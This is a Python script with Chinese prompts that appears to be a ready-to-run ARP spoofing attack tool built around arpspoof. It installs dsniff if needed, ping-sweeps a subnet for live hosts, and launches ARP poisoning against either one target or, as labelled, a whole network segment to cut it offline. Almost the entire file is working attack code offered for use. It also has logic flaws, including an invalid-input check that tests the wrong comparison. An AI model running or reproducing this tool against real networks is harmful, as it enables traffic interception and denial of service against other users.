import os
import pexpect
import datetime
from threading import Thread
print("\t由GNUBHCkalitarro制作寄生arp攻击工具 \n>>> 主支持系统为kali Linux 如果你在别的系统上也下载了arpspoof也可以正常使用 <<<")
print("\t这个工具寄生于arpspoof,使用要检查环境")
print('问世日期：2023-4-27-15-27')
print("（1）检查环境")
print("（2）开始攻击")
print("（3）检测网段在线人数")
anzhuang_ceshi = ""
gongjiqunti = 0
yindao_kaishi = int(input("选择输入括号中的数字》"))
# 1 == 识别有   2 == 识别没有  3 == 扫描在线ip   4++  ==  提示错误 非else  elif 3<
if yindao_kaishi == 1 :
    if os.path.isfile('/usr/sbin/arpspoof') == True :
        print("您拥有arpspoof")
    else:
        print("无arpspoof\n开始安装")
        os.system("apt install dsniff")
        anzhuang_ceshi = input("安装失败？ y/n")
        if anzhuang_ceshi == "y" :
            os.system("sudo apt-get update")
elif yindao_kaishi == 2 :
    print("（1）点对点攻击")
    print("（2）全部断网")
    gongjiqunti = int(input("选择你的攻击方式》》》"))
    if gongjiqunti == 1 :
        os.system("ifconfig")
        wangka = input("输入你的网卡》")
        mubiao = input("输入攻击目标》")
        wangguan = input("输入攻击网关》")
        print("开始攻击 ‘ ctrl + z ‘ 停止攻击 》》》》》》》》》")
        os.system(f"arpspoof -i {wangka} -t {mubiao} {wangguan}")
    elif gongjiqunti == 2 :
        os.system("ifconfig")
        wangka = input("输入你的网卡》")
        mubiao = input("输入攻击网段 如：192.168.1.0》")
        wangguan = input("输入攻击网关》")
        print("开始攻击 ‘ ctrl + z ‘ 停止攻击 》》》》》》》》》")
        os.system(f"arpspoof -i {wangka} -t {mubiao} {wangguan}")
elif yindao_kaishi == 3 :
# 识别在线ip
    wangduan = input("请输入网段如（192.168.1 自动扫描1网段）>>>")
    wangduan_jiashu = 0
    zongshebei = 0
    for a in range(1, 255):
        wangduan_jiashu += 1
        ping_mubiao = [f"{wangduan}.{wangduan_jiashu}"]
        class PING(Thread):
            def __init__(self, ip):
                Thread.__init__(self)
                self.ip = ip

            def run(self):
                Curtime = datetime.datetime.now()
                ping = pexpect.spawn("ping -c1 %s" % (self.ip))
                check = ping.expect([pexpect.TIMEOUT, "1 packets transmitted, 1 received, 0% packet loss"], 2)
                if check == 1:
                    print("[%s] %s 在线" % (Curtime, self.ip))
# 多线程
        T_thread = []
        for i in ping_mubiao:
            t = PING(i)
            T_thread.append(t)
        for i in range(len(T_thread)):
            T_thread[i].start()
elif yindao_kaishi < 3 :
    print(f"请输入1-3数字，您当前输入的是：{yindao_kaishi}，{yindao_kaishi}为无效数字")